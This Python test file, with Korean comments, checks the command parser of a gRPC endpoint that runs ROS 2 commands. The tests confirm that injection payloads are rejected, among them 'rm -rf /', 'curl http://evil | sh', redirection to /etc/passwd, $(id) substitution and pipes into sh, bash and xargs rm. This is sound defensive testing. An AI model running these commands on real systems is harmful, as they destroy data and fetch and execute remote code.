"""ExecuteROSCommand 명령 파싱/검증 회귀 테스트.

gRPC로 노출된 엔드포인트이므로, 'ros2'로 시작하기만 하면 쉘에 그대로 넘기는
구현으로 되돌아가지 않도록 주입 페이로드를 고정 검증한다.
"""

from pathlib import Path

_SERVICE_PATH = (
    Path(__file__).resolve().parents[1]
    / "robo_claw_grpc"
    / "services"
    / "robot_command_service.py"
)


def _load_parser():
    """의존성(grpc, robo_pb2) 없이 파서 함수만 떼어내 로드한다."""
    source = _SERVICE_PATH.read_text(encoding="utf-8")
    # 모듈 상단 상수 + _parse_ros_command 정의까지만 사용한다.
    head = source.split("async def _spawn_pipeline")[0]
    body = "\n".join(
        line
        for line in head.splitlines()
        if not line.startswith(("from grpc", "from robo_claw_grpc"))
    )
    namespace: dict = {}
    exec(compile(body, str(_SERVICE_PATH), "exec"), namespace)
    return namespace["_parse_ros_command"]


_parse = _load_parser()


def test_allows_plain_ros2_command():
    segments, error = _parse("ros2 topic list")

    assert error == ""
    assert segments == [["ros2", "topic", "list"]]


def test_allows_pipeline_with_readonly_filters():
    segments, error = _parse("ros2 topic echo /scan | head -n 20 | wc -l")

    assert error == ""
    assert segments == [
        ["ros2", "topic", "echo", "/scan"],
        ["head", "-n", "20"],
        ["wc", "-l"],
    ]


def test_splits_pipe_without_surrounding_spaces():
    segments, error = _parse("ros2 topic list|grep scan")

    assert error == ""
    assert segments == [["ros2", "topic", "list"], ["grep", "scan"]]


def test_preserves_pipe_inside_quotes():
    segments, error = _parse(
        "ros2 topic pub /chatter std_msgs/String \"data: 'a|b'\""
    )

    assert error == ""
    assert segments == [
        ["ros2", "topic", "pub", "/chatter", "std_msgs/String", "data: 'a|b'"]
    ]


def test_rejects_command_chaining():
    for payload in (
        "ros2 topic list; rm -rf /",
        "ros2 topic list && curl http://evil | sh",
        "ros2 topic list || rm -rf /",
    ):
        segments, error = _parse(payload)
        assert segments == [], payload
        assert error, payload


def test_rejects_redirection():
    segments, error = _parse("ros2 topic echo /x > /etc/passwd")

    assert segments == []
    assert error


def test_rejects_command_substitution():
    for payload in ("ros2 topic list $(id)", "ros2 topic list `id`"):
        segments, error = _parse(payload)
        assert segments == [], payload
        assert error, payload


def test_rejects_non_ros2_entrypoint():
    segments, error = _parse("rm -rf /")

    assert segments == []
    assert error


def test_rejects_shell_as_pipe_target():
    for payload in (
        "ros2 topic list | sh",
        "ros2 topic list | bash",
        "ros2 topic list | awk 'BEGIN{system(\"id\")}'",
        "ros2 topic list | xargs rm",
        "ros2 topic list | tee /tmp/x",
    ):
        segments, error = _parse(payload)
        assert segments == [], payload
        assert error, payload


def test_rejects_unbalanced_quotes():
    segments, error = _parse("ros2 topic pub 'unbalanced")

    assert segments == []
    assert error


def test_rejects_empty_command():
    segments, error = _parse("")

    assert segments == []
    assert error
